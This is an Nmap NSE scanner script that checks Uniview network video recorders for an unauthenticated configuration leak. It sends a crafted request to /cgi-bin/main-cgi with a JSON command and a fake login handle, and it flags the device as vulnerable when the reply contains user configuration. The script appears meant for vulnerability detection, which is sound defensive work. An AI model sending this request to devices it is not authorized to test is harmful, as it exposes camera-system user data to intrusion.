local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local shortport = require "shortport"


description = [[
宇视视频设备配置信息泄露漏洞，影响的设备型号如下:
NVR304-16E NVR301-08-P8
攻击者无需身份验证即可访问配置信息
]]


author = "seaung"


license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"uniview_infoleak_01"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	local output = stdnse.output_table()

	local path = [[/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":8888888888}]]

	local res = http.get(host, port, path)

	if res.status == 200 then
		if string.find(res.body, "UserCfg") ~= nil and string.find(res.body, "Num") then
			output = "Found vulnerable."
		else
			output = "Not vulnerable."
		end
	else
		output = "Not vulnerable."
	end
	return output
end

